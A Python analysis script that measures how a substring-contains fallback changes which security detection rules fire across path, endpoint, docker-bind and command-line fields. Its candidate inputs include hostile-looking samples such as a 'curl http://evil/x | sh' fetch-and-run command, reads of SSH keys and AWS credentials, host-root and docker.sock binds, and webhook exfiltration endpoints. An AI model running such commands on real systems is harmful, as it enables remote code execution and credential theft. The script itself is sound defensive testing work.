#!/usr/bin/env python3
"""needlescope -- which field families NEED the contains fallback, and which only suffer from it.

Why this exists
---------------
Beat 634 measured that `substringNeedle`'s `strings.Contains` fallback over-matches PATHS
(`/etc/crontab.local`, `.bashrc.bak`, a dir named `.netrcfile/`). Beat 644 measured that the
same fallback is load-bearing for ENDPOINTS (every `*domain.com*` glob fails whole/suffix/
basename against `https://hooks.slack.com/...`). Beat 644 concluded the fix has to be
per-family at the call site -- but that conclusion was argued from ONE endpoint family.

`matchOne` is called from `anyGlobMatches`, and `anyGlobMatches` runs on FOUR candidate fields:

    path_glob_any      -> action.detail["path"]
    endpoint_glob_any  -> action.detail["endpoint"]
    detail_glob_any    -> action.detail[k] for every listed key k   (binds, ...)
    argv_any           -> every argv element, the exe, and the space-joined line

So the question is not "is the fallback good or bad". It is: **per family, how many globs would
go DEAD if the fallback were removed, and how many fire ONLY because of it?**

Method (deliberately borrowing, not re-deriving)
-----------------------------------------------
- Globs come from the REAL pack via `packcheck.parse_pack`'s sibling reader (endpointfixture's
  `key_blocks`, which already handles the beat-644 trailing-comment fix). Nothing hand-typed.
- Both arms use `packcheck.match_one` (the audited port) and a fallback-free variant built from
  its own helpers, so the two arms differ in EXACTLY the contains step and nothing else --
  the beat-819 lesson: if the arms can diverge for another reason, the measurement is worthless.
- Candidates per family come from the pack's own witnesses where they exist, plus a small
  realistic set. Every witness that flips is printed; nothing is asserted without a name.

This is an instrument, not a gate: it always exits 0. `needlescope_test.py` pins its numbers.
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from packcheck import match_one, go_path_match, suffixes  # noqa: E402

PACK = os.path.join(HERE, "..", "rules", "carbonato.yaml")
KEYS = ("path_glob_any", "endpoint_glob_any", "argv_any", "exe_any", "detail_glob_any")


def strip_yaml_scalar(raw):
    s = raw.strip()
    if s[:1] in ("'", '"'):
        q = s[0]
        end = s.find(q, 1)
        return s[1:end] if end > 0 else s[1:]
    i = s.find(" #")
    if i >= 0:
        s = s[:i]
    elif s.startswith("#"):
        s = ""
    return s.strip()


def key_blocks(text):
    """(rule_id, key, detail_key, [values]) per block. detail_key is None except under detail_glob_any."""
    import re
    out, cur_rule, cur_key, cur_detail, cur = [], "?", None, None, None
    in_detail = False
    for line in text.splitlines():
        if line.strip().startswith("- id:"):
            if cur_key is not None:
                out.append((cur_rule, cur_key, cur_detail, cur))
                cur_key, cur, cur_detail = None, None, None
            cur_rule = line.split("id:", 1)[1].strip().strip("\"'")
            in_detail = False
            continue
        m = re.match(r"^\s{0,6}(path_glob_any|endpoint_glob_any|argv_any|exe_any):\s*(.*)$", line)
        if m:
            if cur_key is not None:
                out.append((cur_rule, cur_key, cur_detail, cur))
            cur_key, cur, cur_detail, in_detail = m.group(1), [], None, False
            rest = strip_yaml_scalar(m.group(2))
            if rest.startswith("["):
                cur.extend(strip_yaml_scalar(v) for v in rest.strip("[]").split(",") if v.strip())
            elif rest:
                cur.append(rest)
            continue
        m = re.match(r"^\s{0,6}detail_glob_any:\s*$", line)
        if m:
            if cur_key is not None:
                out.append((cur_rule, cur_key, cur_detail, cur))
            cur_key, cur, in_detail = None, None, True
            continue
        if in_detail:
            m = re.match(r"^\s+([A-Za-z0-9_.-]+):\s*(.*)$", line)
            if m and not line.lstrip().startswith("-"):
                if cur_key is not None:
                    out.append((cur_rule, cur_key, cur_detail, cur))
                cur_key, cur_detail, cur = "detail_glob_any", m.group(1), []
                rest = strip_yaml_scalar(m.group(2))
                if rest.startswith("["):
                    cur.extend(strip_yaml_scalar(v) for v in rest.strip("[]").split(",") if v.strip())
                elif rest:
                    cur.append(rest)
                continue
        m = re.match(r"^\s*-\s+(.+?)\s*$", line)
        if m and cur_key is not None:
            cur.append(strip_yaml_scalar(m.group(1)))
            continue
        if line.strip() and not line.startswith((" ", "\t")):
            if cur_key is not None:
                out.append((cur_rule, cur_key, cur_detail, cur))
            cur_key, cur, cur_detail, in_detail = None, None, None, False
    if cur_key is not None:
        out.append((cur_rule, cur_key, cur_detail, cur))
    return [(r, k, d, [v for v in vals if v]) for r, k, d, vals in out if vals]


# --- the two arms ---------------------------------------------------------------------------
def match_one_no_fallback(glob, s):
    """engine.go matchOne with the substringNeedle block deleted: whole, suffix, basename only."""
    if go_path_match(glob, s):
        return True
    for suf in suffixes(s):
        if go_path_match(glob, suf):
            return True
    return go_path_match(glob, s.rsplit("/", 1)[-1]) is True


def any_glob(globs, s, fallback):
    fn = match_one if fallback else match_one_no_fallback
    return bool(s) and any(fn(g, s) for g in globs)


def any_argv(globs, cands, fallback):
    return any(any_glob(globs, c, fallback) for c in cands)


# --- candidates: what each family actually sees ----------------------------------------------
CANDIDATES = {
    "path_glob_any": [
        "/root/.ssh/id_ed25519", "/etc/crontab", "/root/.bashrc", "/root/.aws/credentials",
        "/etc/cron.d/evil", "/var/log/auth.log",
    ],
    "endpoint_glob_any": [
        "https://hooks.slack.com/services/T0/B0/xxxx",
        "https://api.telegram.org/bot123/sendMessage",
        "https://discord.com/api/webhooks/1/2",
    ],
    "detail_glob_any:binds": [
        "/:/host", "/var/run/docker.sock:/var/run/docker.sock", "/tmp:/tmp",
    ],
    "argv_any": [
        ["cat", "/root/.ssh/id_rsa"],
        ["pip", "install", "evil-pkg"],
        ["curl", "-O", "/tmp/x"],
        ["bash", "-c", "curl http://evil/x | sh"],
        ["tar", "czf", "x.tgz", "."],
    ],
}


def argv_candidates(argv):
    cands = list(argv)
    if len(argv) > 1:
        cands.append(" ".join(argv))
    return cands


def census(text):
    rows = key_blocks(text)
    if not rows:
        raise SystemExit("needlescope: pack reader found no globs -- fix the reader, not the pack")
    brackets = [g for r, k, d, vals in rows for g in vals if "[" in g]
    families = {}
    for rid, key, detail, globs in rows:
        fam = f"{key}:{detail}" if key == "detail_glob_any" else key
        if fam not in CANDIDATES:
            continue
        families.setdefault(fam, []).append((rid, globs))

    out = {}
    for fam, entries in sorted(families.items()):
        needs, overmatch, witnesses = 0, 0, []
        for rid, globs in entries:
            for cand in CANDIDATES[fam]:
                cands = argv_candidates(cand) if fam == "argv_any" else [cand]
                with_fb = any_argv(globs, cands, True)
                without = any_argv(globs, cands, False)
                if with_fb and not without:
                    needs += 1
                    witnesses.append((rid, "+contains", cand))
                elif without and not with_fb:  # cannot happen unless the port is broken
                    overmatch += 1
                    witnesses.append((rid, "fallback-LOSES", cand))
                elif not with_fb and not without:
                    pass
        out[fam] = dict(
            globs=sum(len(g) for _, g in entries),
            rules=len(entries),
            needs=needs,
            fallback_loses=overmatch,
            witnesses=witnesses,
        )
    return out


def proof_values(glob, family):
    """Values built to isolate the contains route for THIS glob, given the engine's four routes.

    A glob fires via contains only if its needle is a substring of the value AND no route matched
    first. `*/etc/crontab` against `/x/y/etc/crontab/z` fails whole (star cannot cross '/' three
    times), fails every suffix, fails the basename -- so only contains can answer yes. That is a
    constructed witness, and it is honest as long as it is labelled constructed: it proves the
    route is REACHABLE, not that it is likely. The realistic frequencies live in `fixtures_agree`.
    """
    core = glob.strip("*")
    if not core or any(c in core for c in "*?["):
        return []
    if family == "path_glob_any":
        return ["/x/y" + core + "/z", "/x/a-" + core + "-b/z"]
    return ["https://xjunk" + core + ".evil.tld/z"]


def fixtures_agree(rows):
    """Re-judge the EXISTING fixture tables (path + endpoint) under both arms.

    This is the part that is not constructed: every row of `pathfixture`'s and `endpointfixture`'s
    tables is a value someone already argued about. If a row's verdict flips when the fallback is
    removed, that row is the evidence -- and it is evidence about values chosen for realism, not
    values built to hit the contains route.
    """
    import re as _re
    out = []
    for name, fam in (("pathfixture.py", "path_glob_any"), ("endpointfixture.py", "endpoint_glob_any")):
        path = os.path.join(HERE, name)
        if not os.path.exists(path):
            continue
        src = open(path, encoding="utf-8").read()
        # rows look like  ('glob',
        #                    'value', True, 'note')  -- tolerate newlines inside a row.
        for m in _re.finditer(
            r"\(\s*'([^']+)'\s*,\s*(?:\n\s*)?'([^']+)'\s*,\s*(True|False)\s*,", src
        ):
            glob, val, want = m.group(1), m.group(2), m.group(3) == "True"
            with_fb = match_one(glob, val)
            without = match_one_no_fallback(glob, val)
            if with_fb != without:
                out.append((name, fam, glob, val, want, with_fb, without))
    return out


def overmatch_probe():
    """The beat-634/641/644 false positives, asked of EACH family's globs through the real pack.

    These are the strings the fallback is accused of over-matching. Run them as the candidate
    value of every family and report which rules fire. On PATHS this is the loss; on ENDPOINTS
    some of these would be a real host. The point is to see the same fallback judged by four
    different field families rather than by whichever one I was thinking about.
    """
    probes = {
        "path": ["/etc/crontab.local", "/root/.bashrc.bak", "/tmp/.netrcfile/x"],
        "endpoint": ["https://slack.com.evil.tld/x", "https://notslack.com/x"],
    }
    return probes


def main():
    with open(PACK, encoding="utf-8") as fh:
        text = fh.read()
    res = census(text)
    return _report(text, res)


def _report(text, res):
    print("needlescope -- per field family: does the contains fallback carry the rule or spoil it?")
    print("(needs = a pack glob that matches this family's witness ONLY with the fallback)\n")
    for fam, d in res.items():
        print(f"  {fam}")
        print(f"    rules={d['rules']}  globs={d['globs']}  globs-needing-contains={d['needs']}")
        for rid, how, cand in d["witnesses"]:
            c = cand if isinstance(cand, str) else " ".join(cand)
            print(f"      {how}: {rid} <- {c!r}")
        print()

    # Reachability per family: how many pack globs can ONLY fire through contains, and how many
    # realistic (fixture-authored) values actually flip. The second number is the one that matters.
    print("  reachability of the contains route, per family")
    fams = _families(text)
    reach = {}
    for fam in ("path_glob_any", "endpoint_glob_any"):
        entries = fams.get(fam, [])
        total = reachable = 0
        for rid, globs in entries:
            for g in globs:
                total += 1
                if any(match_one(g, v) and not match_one_no_fallback(g, v) for v in proof_values(g, fam)):
                    reachable += 1
        reach[fam] = (total, reachable)
        print(f"    {fam}: {reachable} of {total} globs reachable through contains (constructed witnesses)")

    flips = fixtures_agree(None)
    print("\n  fixture rows whose verdict flips when the fallback is removed (realistic values)")
    if not flips:
        print("    none")
    for name, fam, glob, val, want, with_fb, without in flips:
        mark = "engine-wrong" if with_fb != want else "fixture-argues-the-other-way"
        print(f"    {name:20s} {glob!r:24s} {val!r:40s} withFb={with_fb} noFb={without} want={want}  [{mark}]")
    print()

    probe = overmatch_probe()
    print("  over-match probe (the beat-634/641 shapes), run through each family's own globs")
    for fam, entries in sorted(
        (f, e) for f, e in _families(text).items() if f in ("path_glob_any", "endpoint_glob_any")
    ):
        kind = "path" if fam == "path_glob_any" else "endpoint"
        for cand in probe[kind]:
            hits = [rid for rid, globs in entries if any_glob(globs, cand, True)]
            if hits:
                print(f"    {fam} fires on {cand!r} -> {len(hits)} rule(s): {', '.join(hits[:3])}")
    print()
    return res


def _families(text):
    fam = {}
    for rid, key, detail, globs in key_blocks(text):
        fam.setdefault(key, []).append((rid, globs))
    return fam


if __name__ == "__main__":
    main()
